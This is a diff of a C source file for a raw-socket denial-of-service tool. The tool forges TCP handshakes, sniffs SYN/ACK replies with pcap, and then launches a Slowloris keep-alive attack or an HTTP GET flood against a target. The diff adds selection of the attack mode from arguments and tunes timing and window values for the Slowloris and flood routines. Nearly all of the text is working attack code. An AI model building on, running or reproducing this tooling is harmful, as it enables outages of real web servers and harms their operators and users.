@@ -1,10 +1,5 @@
 #include "handshake.h"
 
-struct attack_params {
-        u_char *args[3];
-        const u_char *a_packet;
-};
-
 void send_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
 {
     //printf("SEND ACK request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
@@ -38,7 +33,7 @@ void send_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_in
     iph.ip_sum = 0;
     iph.ip_src.s_addr = (u_int32_t) *source_ip;
     iph.ip_dst.s_addr = (u_int32_t) *dst_ip;
-    iph.ip_sum = csum((unsigned short *) pkt_syn_ack, iph.ip_len >> 1);
+    iph.ip_sum = chksum((unsigned short *) pkt_syn_ack, iph.ip_len >> 1);
 
     //printf("Source port in ACK message is: %u\n", source_port);
     memcpy(pkt_syn_ack, &iph, sizeof(iph));
@@ -79,7 +74,7 @@ void send_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_in
     }
 
     free(pkt_syn_ack);
-    slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
+    //slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
     //get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
     close(sock_raw);
 }
@@ -158,6 +153,8 @@ void packet_process(struct attack_params *packet)
     ip = (struct ip *)(packet->a_packet + sizeof(struct ether_header));
     //printf("Size of ether_header is: %d\n", sizeof(struct ether_header));
     tcp = (struct tcphdr *)(packet->a_packet + SIZE_ETHERNET + (IP_HL(ip)*4));
+    
+    //if(tcp->th_flags & TH_ACK && !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
     if(tcp->th_flags == 0x12) //
     {
         printf("---------------------------\n");
@@ -173,35 +170,17 @@ void packet_process(struct attack_params *packet)
 
         send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
     }
-    if(tcp->th_flags == 0x18) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
-    {
-        printf("---------------------------\n");
-        printf("GOT PUSH/ACK PACKET!\n");
-        printf("---------------------------\n");
-
-        u_int32_t seq_n = ntohl(tcp->th_seq);
-        u_int32_t ack_n = ntohl(tcp->th_ack);
-
-        send_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
-    }
-
-    //if(tcp->th_flags & TH_ACK) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
+    //if(tcp->th_flags == 0x18) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
     //{
     //    printf("---------------------------\n");
-    //    printf("GOT SYN/ACK PACKET!\n");
+    //    printf("GOT PUSH/ACK PACKET!\n");
     //    printf("---------------------------\n");
-    //    printf("Packet with src IP: %s\n", inet_ntoa(ip->ip_src));
-    //    printf("Packet with dst IP: %s\n", inet_ntoa(ip->ip_dst));
-    //    printf("Packet's seq: %u\n", ntohl(tcp->th_seq));
-    //    printf("Packet's ack: %u\n", ntohl(tcp->th_ack));
 
     //    u_int32_t seq_n = ntohl(tcp->th_seq);
     //    u_int32_t ack_n = ntohl(tcp->th_ack);
 
-    //    send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
+    //    send_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
     //}
-
-
 }
 
 int packet_receive(u_char *argv[], const struct pcap_pkthdr *pkthdr, u_char *packet)
@@ -306,8 +285,17 @@ void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, 
     }
 
     free(pkt_syn_ack);
-    //slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
-    get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
+
+    if(strcmp(argv[0], "slowloris") == 0)
+    {
+        printf("\nSlowloris");
+        slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
+    }
+    else if(strcmp(argv[0], "http") == 0)
+    {
+        printf("\nHTTP Get!");
+        get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
+    }
     close(sock_raw);
 }
 
@@ -411,7 +399,7 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
         //Seq numbers has to be changed for every packet!
         memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data, pkt_data_len2 * sizeof(u_int8_t));
 
-        sleep(10);
+        sleep(60);
         printf("Sending Keep-Alive packet from thread: %lu.\n", pthread_self());
         if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len2, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
         {
@@ -419,7 +407,7 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
             exit(1);
         }
         //free(pkt_data);
-        sleep(10);
+        //sleep(10);
 
     }
     free(pkt_data);
@@ -496,7 +484,7 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     tcph.th_x2 = 0;
     tcph.th_off = sizeof(struct tcphdr) / 4;
     tcph.th_flags = TH_ACK;
-    tcph.th_win = htons(28);
+    tcph.th_win = htons(29200);
     tcph.th_sum = 0;
     tcph.th_urp = 0;
     //tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, 20 + 20 + pkt_data_len);
@@ -568,88 +556,4 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
 
 }
 
-/*int send_syn(int sock_raw, char *source_ip, struct in_addr dst_ip, u_int16_t *source_port, char *argv[])
-{
-//IP header
-    struct ip iph;
-    struct tcphdr tcph;
-    struct sockaddr_in dest;
 
-    char *packet_to_send;
-    packet_to_send = (char *)malloc(60);
-    if(packet_to_send == NULL)
-    {
-        perror("Could not allocate packet_to_send mem on heap.\n");
-        exit(-1);
-    }
-    //Zero out the packet memory area
-    //memset(packet_to_send, 0, 4096);
-    //Fill in the IP header
-    iph.ip_hl = 5;
-    iph.ip_v = 4;
-    iph.ip_tos = 0;
-    iph.ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
-    iph.ip_id = htons(12345);
-    iph.ip_off = 0;
-    iph.ip_ttl = 64;
-    iph.ip_p = IPPROTO_TCP;
-    iph.ip_sum = 0; //Will be calculated afterwards
-    iph.ip_src.s_addr = inet_addr(source_ip);
-    iph.ip_dst.s_addr = dst_ip.s_addr;
-
-    //Function that calculates checksum is implemented in trafgen
-    iph.ip_sum = csum((unsigned short *) packet_to_send, iph.ip_len >> 1);
-
-    memcpy(packet_to_send, &iph, sizeof(iph));
-
-    //Fill in the TCP header
-    tcph.th_sport = htons(*source_port);
-    tcph.th_dport = htons(80);
-    tcph.th_seq = htonl(0);
-    tcph.th_ack = htonl(0);
-    tcph.th_x2 = 0;
-    tcph.th_off = sizeof(struct tcphdr) / 4;
-    tcph.th_flags = TH_SYN;
-    tcph.th_win = htons(29200);
-    tcph.th_sum = 0;
-    tcph.th_urp = 0;
-    tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));
-
-    memcpy((packet_to_send + sizeof(iph)), &tcph, sizeof(tcph));
-
-    int one = 1;
-
-    //IP_HDRINCL tells the kernel that headers are included
-    if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
-    {
-        fprintf(stderr, "Error setting up setsockopt!\n");
-        return 1;
-    }
-
-    printf("Starting sniffing.\n");
-    pthread_t thread1;
-
-    //Creating thread with start_sniffing() function call, will start receiving packets and process them
-    if(pthread_create(&thread1, NULL, (void *)start_sniffing, argv) < 0)
-    {
-        fprintf(stderr, "Failed to create a new thread.\n");
-        return 1;
-    }
-    sleep(1);
-
-    printf("Starting to send packets.\n");
-
-    //dest - sockaddr_in
-    memset(&dest, 0, sizeof(dest));
-    dest.sin_family = AF_INET;
-    dest.sin_addr.s_addr = iph.ip_dst.s_addr;
-
-    //Send the packet out
-    if(sendto(sock_raw, packet_to_send, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
-    {
-        fprintf(stderr, "Error sending syn packet! Error message: %s\n", strerror(errno));
-        exit(1);
-    }
-    free(packet_to_send);
-    return 0;
-}*/
